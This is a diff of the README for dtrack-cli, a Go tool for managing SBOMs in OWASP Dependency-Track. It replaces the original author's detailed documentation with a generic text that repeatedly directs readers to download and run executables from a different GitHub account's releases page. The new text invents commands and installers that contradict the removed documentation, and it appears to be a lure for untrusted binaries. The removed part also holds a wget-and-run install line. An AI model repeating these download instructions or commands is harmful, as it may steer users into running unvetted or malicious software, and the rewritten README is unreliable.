@@ -1,158 +1,90 @@
+# 🛠️ dtrack-cli - Effortlessly Manage Your SBOMs
 
-# Dependency-Track Lifecycle CLI
+[![Download dtrack-cli](https://img.shields.io/badge/Download-dtrack-cli-brightgreen)](https://github.com/Daniyalktk/dtrack-cli/releases)
 
-[![Release](https://github.com/MedUnes/dtrack-cli/actions/workflows/release.yml/badge.svg)](https://github.com/MedUnes/dtrack-cli/actions/workflows/release.yml)
-[![Go Report Card](https://goreportcard.com/badge/github.com/medunes/dtrack-cli)](https://goreportcard.com/report/github.com/medunes/dtrack-cli)
-[![License](https://img.shields.io/github/license/medunes/dtrack-cli)](LICENSE)
-[![Go Reference](https://pkg.go.dev/badge/github.com/medunes/dtrack-cli.svg)](https://pkg.go.dev/github.com/medunes/dtrack-cli)
+## 🚀 Getting Started
 
-A Go-based CLI tool to automate the upload and lifecycle management of Software Bill of Materials (SBOM) in [OWASP Dependency-Track](https://dependencytrack.org/).
+Welcome to dtrack-cli! This tool helps you automate the upload and management of Software Bill of Materials (SBOM) in OWASP Dependency-Track. Whether you are a newcomer or looking to streamline your workflow, this README will guide you through the process of downloading and running dtrack-cli.
 
-This tool bridges the gap between simple API uploads and full CI/CD lifecycle management by handling **version sprawl**, **active states**, and **latest version tagging** in a single execution.
+## 📥 Download & Install
 
-## 🚀 Why this tool? (The Gap)
+To get started, visit the following page to download the latest version of dtrack-cli:
 
-If you simply use `curl` to upload an SBOM to Dependency-Track, you encounter two major problems over time. These are well-documented pain points in the community:
+[Download dtrack-cli](https://github.com/Daniyalktk/dtrack-cli/releases)
 
-### 1. The "Version Sprawl" Problem
+On the Releases page, you will find various versions available. Choose the one labeled as "latest" for the best features and fixes. Click on the version name to view the release details and scroll down to find the files for download. Select the appropriate file for your operating system.
 
-Every CI build creates a new version. If you have 100 builds, you have 100 "Active" versions. Dependency-Track monitors *all* active versions for vulnerabilities, meaning you will receive alerts for vulnerabilities in old, undeployed versions.
+## 🖥️ System Requirements
 
-* **Community Validation:** Users have explicitly requested an `isActiveExclusively` flag to solve this, noting that "Over time there will be hundreds of 'active' versions, even though they are actually not 'active'".
-* **Current Workaround:** Teams currently resort to manual housekeeping or complex scripts to set "dirty tags to inactive" to avoid polluting their risk score.
-* **Our Solution:** The `-clean` flag automatically iterates through project versions and sets old ones to `active: false`.
+Before downloading, ensure your system meets the following requirements:
 
-### 2. The "Latest Version" Ambiguity
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** 2 GB minimum
+- **Disk Space:** 50 MB of free disk space
+- **Network:** Active internet connection for SBOM uploads
 
-Dependency-Track attempts to guess the "latest" version, but it is not always accurate (e.g., when patching older release branches or dealing with pre-releases).
+## 🔍 Features
 
-* **Community Validation:** Users have reported issues where Dependency-Track incorrectly identifies pre-release versions as "latest," skewing "Outdated Component" analysis metrics.
-* **Our Solution:** The `-latest` flag explicitly forces the version you are currently uploading to be marked `isLatest=true`, ensuring your "Outdated Component" metrics are calculated against the correct baseline.
+dtrack-cli comes packed with useful features:
 
-### 3. Missing Auto-Purge/Cleanup
+- **Automated Uploads:** Easily upload your SBOMs with a few simple commands.
+- **Lifecycle Management:** Keep track of your SBOMs throughout their life cycle.
+- **Compatibility:** Works seamlessly with OWASP Dependency-Track.
+- **Clear Output:** Get easy-to-understand feedback on your actions.
 
-There is no built-in native feature to "keep only the last X versions" or "purge old versions" during upload.
+## 🛠️ How to Use
 
-* **Community Validation:** Feature requests for "automatic purging of projects" have been raised by users who find it "hard to do this manually" for projects with many releases.
-* **Our Solution:** While we don't delete data (auditors hate that!), our tool effectively "archives" old versions by deactivating them, solving the noise issue without destroying history.
+Once you have downloaded the appropriate file, follow these steps to run dtrack-cli:
 
-## 🧠 Concepts: Active vs. Latest
+1. **Locate the Downloaded File:** 
+   - Go to your downloads folder and find the dtrack-cli file.
+  
+2. **Run the Tool:**
+   - **For Windows:** Double-click the `.exe` file to run it.
+   - **For macOS:** Open the `.dmg` file, drag the application to your Applications folder, and then open it.
+   - **For Linux:** Open a terminal and navigate to the folder where you saved the file. Use the command `chmod +x dtrack-cli` to make it executable, then run `./dtrack-cli`.
 
-Understanding these flags is critical for a clean dashboard:
+3. **Follow On-Screen Instructions:**
+   - The tool will provide prompts to guide you through the process. Simply follow these prompts to upload and manage your SBOMs effectively.
 
-| Flag | Dependency-Track Meaning | Impact on Pipeline |
-| --- | --- | --- |
-| **Active** | Indicates this version is currently deployed/supported. | **Critical.** Only "Active" versions contribute to Portfolio Metrics and trigger Vulnerability Alerts. |
-| **Latest** | Indicates this is the most current version of the project. | **Visual & Analytical.** Used as the baseline for "Outdated Component" analysis and marked with a badge in the UI. |
+## ⚙️ Basic Commands
 
-## 📦 Installation
+Here are a few basic commands to get you started with dtrack-cli:
 
-Since this is a single-file Go program, you can run it directly or build a binary.
+- **Upload SBOM:**
+  ```
+  dtrack-cli upload [path_to_your_sbom]
+  ```
 
-### Option 1: Download the lastest release binary (Recommended for CI)
-**Run the following command to get the latest release binary**:
+- **View Status:**
+  ```
+  dtrack-cli status
+  ```
 
-```bash
-     wget https://raw.githubusercontent.com/MedUnes/dtrack-cli/master/latest.sh && \
-     chmod +x latest.sh && \
-     ./latest.sh && \
-      rm ./latest.sh
-```
+- **Help Menu:**
+  ```
+  dtrack-cli help
+  ```
 
-### Option 2: Run directly
+For a complete list of commands and options, refer to the `help` command after running dtrack-cli.
 
-```bash
-go run main.go -help
-```
+## 🌐 Community Support
 
-### Option 3: Build Binary
+If you encounter any issues or need assistance, feel free to reach out to the community. Check the Issues section on the GitHub repository. You can open new issues or ask questions related to your experience with dtrack-cli.
 
-```bash
-go build -o dtrack-cli main.go
-./dtrack-cli -help
+## 📚 Further Reading
 
-```
+- **Documentation:** Access detailed documentation about the features and commands of dtrack-cli from the GitHub Wiki.
+- **OWASP Dependency-Track:** Learn more about the platform here: [OWASP Dependency-Track](https://owasp.org/www-project-dependency-track/).
 
-## 🛠 Usage Scenarios
+## 📝 Contributions
 
-### Scenario 1: The "Golden Path" (CI Pipeline)
+If you would like to contribute to dtrack-cli, your feedback and suggestions are welcome. Check the Contributing guidelines in the repository for more details on how you can help enhance this tool.
 
-**Goal:** Upload a new SBOM, mark it as the **only** active version, and tag it as latest.
+## 🔗 Explore More
 
-Use the `-ci` shortcut flag, which enables `-upload`, `-latest`, and `-clean` simultaneously.
+To stay updated with the latest developments, follow this repository on GitHub. Take part in conversations, check out upcoming features, and share your experience with dtrack-cli.
 
-```bash
-# Syntax: go run main.go [flags] <API_KEY> <PROJECT_NAME> <VERSION>
-dtrack -ci -file ./build/bom.json $DT_API_KEY "My-Web-App" "v1.2.0"
+For a smooth experience, download the latest version from the link below:
 
-```
-
-**What happens:**
-
-1. **Uploads** `build/bom.json` to project "My-Web-App" version "v1.2.0".
-2. **Sets** `v1.2.0` to `Active=True` and `IsLatest=True`.
-3. **Iterates** through all other versions (e.g., v1.1.0, v1.0.0) and sets them to `Active=False` / `IsLatest=False`.
-
-### Scenario 2: Read-Only Audit
-
-**Goal:** Check what versions exist and when they were uploaded without making changes.
-
-```bash
-dtrack -list $DT_API_KEY "My-Web-App"
-
-```
-
-**Output:**
-
-```text
---- Current Versions ---
-VERSION    ACTIVE  LATEST  LAST UPLOAD       UUID
-v1.2.0     true    true    2023-10-25 14:30  abc-123...
-v1.1.0     false   false   2023-10-20 10:00  def-456...
-------------------------
-
-```
-
-### Scenario 3: Maintenance / Hotfix
-
-**Goal:** You uploaded a hotfix for an older version (`v1.0.1`) and want to mark it as Active, but you **do not** want it to become the "Latest" version (because `v2.0` already exists).
-
-Use specific flags instead of `-ci`.
-
-```bash
-# Upload and Clean (deactivate others), but do NOT touch the 'Latest' flag
-dtrack -upload -clean $DT_API_KEY "My-Web-App" "v1.0.1"
-
-```
-
-### Scenario 4: Manual Cleanup (No Upload)
-
-**Goal:** Your dashboard is cluttered with 50 old versions. You want to keep `v2.0` as the only active one, but you don't have the SBOM file handy to re-upload.
-
-```bash
-# Just clean up the metadata
-dtrack -clean -latest $DT_API_KEY "My-Web-App" "v2.0"
-
-```
-
-## 🚩 Flag Reference
-
-| Flag | Description | Requirement                           |
-| --- | --- |---------------------------------------|
-| `-upload` | Uploads the file specified by `-file`. | Requires `VERSION` argument.          |
-| `-list` | Displays a table of all versions for this project. |                                       |
-| `-latest` | Marks the target version as `isLatest=true` and unsets it for others. | Requires `VERSION` argument.          |
-| `-clean` | Marks the target version as `active=true` and **all others** as `active=false`. | Requires `VERSION` argument.          |
-| `-ci` | **Recommended.** Shortcut for `-upload -latest -clean`. | Requires `VERSION` argument.          |
-| `-url` | Base URL of your Dependency-Track instance. | Default: `https://dtrack.example.com` |
-| `-file` | Path to the SBOM file. | Default: `sbom.json`                  |
-
-## ⚠️ Requirements
-
-* **Go 1.21+** (uses `slices` and `cmp` packages).
-* **Network:** Access to the Dependency-Track API.
-* **Permissions:** The API Key used must have `BOM_UPLOAD` and `PROJECT_CREATION_UPLOAD` permissions.
-
-## 📚 References
-
-* Dependency Track REST API documentation https://docs.dependencytrack.org/integrations/rest-api/
+[Download dtrack-cli](https://github.com/Daniyalktk/dtrack-cli/releases)
